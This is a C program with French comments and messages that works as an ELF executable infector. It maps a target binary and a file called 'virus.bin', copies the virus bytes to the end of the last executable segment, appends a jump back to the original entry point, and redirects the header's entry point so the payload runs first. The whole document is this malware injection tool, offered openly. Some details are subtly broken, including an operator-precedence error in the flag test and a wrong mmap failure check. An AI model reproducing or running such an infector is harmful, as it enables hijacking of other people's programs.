#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <elf.h>
#include <stdlib.h>
#include <errno.h>
 

int main(int argc, char **argv)
{    
	int fd_virus;
	int fd_input;
	int fd_output;

	struct stat f_stat_input;
	struct stat f_stat_virus;

	void	*binary_input;
	void	*binary_virus;

	Elf64_Ehdr	*ehdr_view;
	Elf64_Phdr	*phdr_view;

    Elf64_Phdr  new_phdr;

	int i;

    Elf32_Addr maxaddr;
    Elf32_Addr maxpos;

    char lolj[] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

	if(argc != 2)
    {
        printf("Usage : %s <filename>\n", argv[0]);
        exit (0);
    }

    if((fd_input = open(argv[1], O_RDWR)) == -1)
    {
    	printf("Impossible de lire l'input.\n");
        exit(0);
    }

    if((fd_virus = open("virus.bin", O_RDWR)) == -1)
    {
    	printf("Impossible de lire le virus.\n");
        exit(0);
    }

    if((fd_output = open("dest", O_RDWR|O_CREAT|O_TRUNC, 0755)) == -1)
    {
    	printf("Impossible de créer l'output.\n");
        exit(0);
    }

    if(fstat(fd_input, &f_stat_input) == -1)
    {
        printf("Error fstat input\n");
        exit(0);
    }

    if(fstat(fd_virus, &f_stat_virus) == -1)
    {
        printf("Error fstat virus\n");
        exit(0);
    }

    // On allue 1024 octets en plus pour pouvoir allonger le programme tranquillou pèpère en mémoire
    if((binary_input = mmap(NULL, f_stat_input.st_size + 1024, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd_input, 0)) == NULL)
    {
        printf("mmap binary_input\n");
        exit(0);
    }


	if((binary_virus = mmap(NULL, f_stat_virus.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd_virus, 0)) == NULL)
    {
        printf("mmap binary_virus\n");
        exit(0);
    }



    ehdr_view = binary_input;
    maxaddr = 0;
    int maxoffset = 0;

    if (ehdr_view->e_phnum > 0) {
        phdr_view = (Elf64_Phdr *)((void *)ehdr_view + ehdr_view->e_phoff);
        for (i = 0; i < ehdr_view->e_phnum; i++) {

            if (maxaddr < phdr_view->p_vaddr + phdr_view->p_memsz)
            {
                if (phdr_view->p_flags & PF_X > 0)
                {
                    maxaddr = phdr_view->p_vaddr + phdr_view->p_memsz;
                    maxoffset = phdr_view->p_offset + phdr_view->p_filesz;
                }
            }
            phdr_view++;
        }
    }

    (*((char*)(binary_input + maxoffset + f_stat_virus.st_size))) = 0xE9;
    (*((int*)(binary_input + maxoffset + f_stat_virus.st_size + 1))) =  ehdr_view->e_entry - (maxaddr + 5 + f_stat_virus.st_size);

    ehdr_view->e_entry = maxaddr;

    printf("%x %x\n", maxoffset, f_stat_input.st_size);

    memcpy(binary_input + maxoffset, binary_virus, f_stat_virus.st_size);

    



    write(fd_output, binary_input, f_stat_input.st_size);

}